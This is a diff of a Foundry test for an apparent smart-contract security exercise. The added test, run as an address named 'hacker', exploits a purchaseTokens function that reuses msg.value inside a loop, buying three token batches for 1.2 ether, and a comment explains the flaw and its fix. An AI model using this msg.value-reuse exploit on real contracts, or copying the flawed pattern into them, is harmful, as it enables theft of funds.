@@ -24,12 +24,22 @@ contract BuyMyTokensTest is Test {
 
 
  
+ 
+    /**
+    Learning: The classic problem of double spending i.e. since msg.value was never updated within the for loop, we kind of bought all 3 tokens with the 1.2 ether only
+    Caution: To update msg.value when used within for loops.
+    i.e. remainingEther = msg,value - (amount * price) must be added at the end of the function and then _purchasingPower must be called with remainingEther instead of msg.value on subsequent calls
+    */
     function test_GetThisPassing_5() public {
         address hacker = address(0xBAD);
         
 
         vm.startPrank(hacker);
-        
+       uint256[] memory amounts = new uint256[](3);
+        amounts[0] = 12;
+        amounts[1] = 6;
+        amounts[2] = 4;
+        target.purchaseTokens{value: 1.2 ether}(amounts);
         vm.stopPrank();
 
         assertEq(token1.balanceOf(hacker), 12 ether);
